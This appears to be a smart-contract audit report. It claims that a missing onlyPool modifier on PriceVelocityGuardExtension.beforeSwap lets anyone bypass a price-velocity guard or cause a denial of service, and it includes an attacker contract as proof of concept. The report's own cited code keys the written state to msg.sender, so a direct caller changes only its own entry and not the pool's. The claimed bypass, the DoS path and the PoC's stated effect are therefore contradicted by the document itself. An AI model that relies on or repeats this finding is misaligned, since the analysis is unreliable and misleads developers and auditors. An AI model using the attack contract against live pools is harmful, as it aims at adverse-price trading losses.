Audit Report

## Title
`PriceVelocityGuardExtension.beforeSwap` Missing `onlyPool` Modifier Allows Unprivileged State Corruption and Guard Bypass — (`metric-periphery/contracts/extensions/PriceVelocityGuardExtension.sol`)

## Summary
`PriceVelocityGuardExtension.beforeSwap` overrides the base implementation without re-applying the `onlyPool` modifier and without any equivalent pool-identity check. Any external caller can invoke it directly with arbitrary bid/ask prices, corrupting `priceVelocityState[msg.sender]` for any address. This enables two distinct attacks: silently resetting the velocity baseline so the guard passes on a real swap in the same block (guard bypass), or setting the baseline far from the current oracle price to make every subsequent legitimate swap revert (DoS).

## Finding Description
`BaseMetricExtension.beforeSwap` declares the `onlyPool` modifier, which checks `IMetricOmmPoolFactory(FACTORY).isPool(msg.sender)`: [1](#0-0) [2](#0-1) 

In Solidity, modifiers are not inherited when a function is overridden. `PriceVelocityGuardExtension.beforeSwap` overrides the base with no `onlyPool` and no substitute check: [3](#0-2) 

The function immediately assigns `msg.sender` to `pool_` and unconditionally writes to `priceVelocityState[pool_]`: [4](#0-3) 

The velocity check is then skipped entirely when `prevMid == 0` (first call for any address) or when `maxChange == 0`: [5](#0-4) 

The analogous `OracleValueStopLossExtension.afterSwap` also drops `onlyPool` but compensates with `_requireInitialized(msg.sender)`, which only passes for addresses the factory has explicitly initialized as pools: [6](#0-5) 

`PriceVelocityGuardExtension` has no equivalent guard. Because `PriceVelocityGuardExtension` does not call `initialize` and has no `initialized` flag, there is no analogous registry check that could be added without a modifier.

**Guard bypass path:** An attacker reads the current oracle bid/ask (on-chain or off-chain), calls `beforeSwap(pool, ..., currentBid, currentAsk, "")` directly. This sets `lastMidPriceX64 = geometric_mid(currentBid, currentAsk)` and `lastUpdateBlock = block.number`. When the real pool swap executes in the same block, `prevMid` equals the current oracle mid, `delta = 0`, `actualSq = 0 ≤ allowedSq`, and the guard silently passes — the velocity circuit breaker is neutralized.

**DoS path:** The attacker calls `beforeSwap` directly with a `bidPriceX64`/`askPriceX64` pair whose geometric mid is far from the current oracle price. Every subsequent legitimate swap computes a large `actualSq > allowedSq` and reverts with `PriceVelocityExceeded` until the pool admin calls `setLastMidPrice` to repair state: [7](#0-6) 

## Impact Explanation
**Guard bypass (bad-price execution):** The velocity guard is the only on-chain circuit breaker for price-velocity anomalies. Bypassing it allows a manipulated or stale oracle price to reach a swap unchecked, causing LP losses through adverse execution. This meets the "bad-price execution" and "broken core pool functionality causing loss of funds" impact criteria.

**State-corruption DoS (unusable swap flows):** The attacker can render the pool's swap function permanently unusable (until admin intervention) with a single external call, meeting the "broken core pool functionality" impact criterion.

## Likelihood Explanation
The call requires no special role, no token balance, and no privileged setup — any EOA or contract can invoke `beforeSwap` directly. The bypass path can be executed atomically in a single transaction alongside the real swap, requiring no multi-block coordination. The DoS path requires only one external call. Both paths are reachable on every pool that has this extension configured.

## Recommendation
Re-apply the `onlyPool` modifier on the override, exactly as the base contract declares it:

```solidity
function beforeSwap(
    address sender,
    address recipient,
    bool zeroForOne,
    int128 amountSpecified,
    uint128 priceLimit,
    uint256 packedSlot0,
    uint128 bidPriceX64,
    uint128 askPriceX64,
    bytes calldata data
) external override onlyPool returns (bytes4) {   // <-- add onlyPool
    ...
}
```

Alternatively, mirror the `OracleValueStopLossExtension` pattern by adding an explicit pool-registry check at the top of the function body, though re-applying the modifier is simpler and consistent with the rest of the extension system.

## Proof of Concept

```solidity
// Attacker contract — no special privileges required
contract VelocityBypass {
    IPriceVelocityGuardExtension immutable guard;
    IMetricOmmPool              immutable pool;

    constructor(address guard_, address pool_) {
        guard = IPriceVelocityGuardExtension(guard_);
        pool  = IMetricOmmPool(pool_);
    }

    function attack(
        uint128 currentBid,   // read from oracle before this tx
        uint128 currentAsk,
        address recipient,
        bool    zeroForOne,
        int128  amount
    ) external {
        // Step 1: Directly call beforeSwap as msg.sender (no pool check).
        //         Sets lastMidPriceX64 = geometric_mid(currentBid, currentAsk)
        //         and lastUpdateBlock  = block.number.
        guard.beforeSwap(
            address(this), recipient, zeroForOne, amount, 0,
            0, currentBid, currentAsk, ""
        );

        // Step 2: Execute the real swap in the same block.
        //         The velocity guard now sees prevMid == currentMid → delta == 0
        //         → actualSq == 0 ≤ allowedSq → guard silently passes.
        pool.swap(recipient, zeroForOne, amount, 0, "");
    }
}
```

After Step 1, `priceVelocityState[pool].lastMidPriceX64` equals the current oracle mid. In Step 2, the pool calls `beforeSwap` on the extension; `prevMid` is the value just written, `blockDiff = 0`, `actualSq = 0`, and the check at line 72 is never triggered — the velocity guard is silently bypassed. [5](#0-4)

### Citations

**File:** metric-periphery/contracts/extensions/base/BaseMetricExtension.sol (L19-24)
```text
  modifier onlyPool() {
    if (!IMetricOmmPoolFactory(FACTORY).isPool(msg.sender)) {
      revert OnlyPool(msg.sender, FACTORY);
    }
    _;
  }
```

**File:** metric-periphery/contracts/extensions/base/BaseMetricExtension.sol (L81-88)
```text
  function beforeSwap(address, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    virtual
    onlyPool
    returns (bytes4)
  {
    revert ExtensionNotImplemented();
  }
```

**File:** metric-periphery/contracts/extensions/PriceVelocityGuardExtension.sol (L29-34)
```text
  function setLastMidPrice(address pool_, uint128 newLastMidPriceX64) external onlyPoolAdmin(pool_) {
    PriceVelocityState storage s = priceVelocityState[pool_];
    s.lastMidPriceX64 = newLastMidPriceX64;
    s.lastUpdateBlock = uint64(block.number);
    emit LastMidPriceUpdated(pool_, newLastMidPriceX64);
  }
```

**File:** metric-periphery/contracts/extensions/PriceVelocityGuardExtension.sol (L36-46)
```text
  function beforeSwap(
    address,
    address,
    bool,
    int128,
    uint128,
    uint256,
    uint128 bidPriceX64,
    uint128 askPriceX64,
    bytes calldata
  ) external override returns (bytes4) {
```

**File:** metric-periphery/contracts/extensions/PriceVelocityGuardExtension.sol (L47-58)
```text
    address pool_ = msg.sender;
    (uint256 midPriceX64,) = SwapMath.midAndSpreadFeeX64FromBidAsk(uint256(bidPriceX64), uint256(askPriceX64));
    // casting to `uint128` is safe: geometric mid of two uint128 bid/ask quotes fits uint128 (same bound as pool)
    // forge-lint: disable-next-line(unsafe-typecast)
    uint128 midPrice = uint128(midPriceX64);

    PriceVelocityState storage s = priceVelocityState[pool_];
    uint128 prevMid = s.lastMidPriceX64;
    uint64 prevBlock = s.lastUpdateBlock;

    s.lastMidPriceX64 = midPrice;
    s.lastUpdateBlock = uint64(block.number);
```

**File:** metric-periphery/contracts/extensions/PriceVelocityGuardExtension.sol (L60-76)
```text
    if (prevMid != 0) {
      uint64 maxChange = s.maxChangePerBlockE18;
      if (maxChange != 0) {
        uint256 blockDiff = block.number - prevBlock;

        uint256 delta = midPrice > prevMid ? uint256(midPrice - prevMid) : uint256(prevMid - midPrice);

        uint256 changeE18 = (delta * 1e18) / uint256(prevMid);

        uint256 actualSq = changeE18 * changeE18;
        uint256 allowedSq = uint256(maxChange) * uint256(maxChange) * (1 + blockDiff);

        if (actualSq > allowedSq) {
          revert PriceVelocityExceeded(actualSq, allowedSq);
        }
      }
    }
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L199-204)
```text
  ) external override returns (bytes4) {
    // Only the factory can initialize, so an initialized msg.sender is a legit pool — no onlyPool needed.
    _requireInitialized(msg.sender);
    _afterSwapOracleStopLoss(msg.sender, packedSlot0Initial, packedSlot0Final, bidPriceX64, askPriceX64, zeroForOne);
    return IMetricOmmExtensions.afterSwap.selector;
  }
```
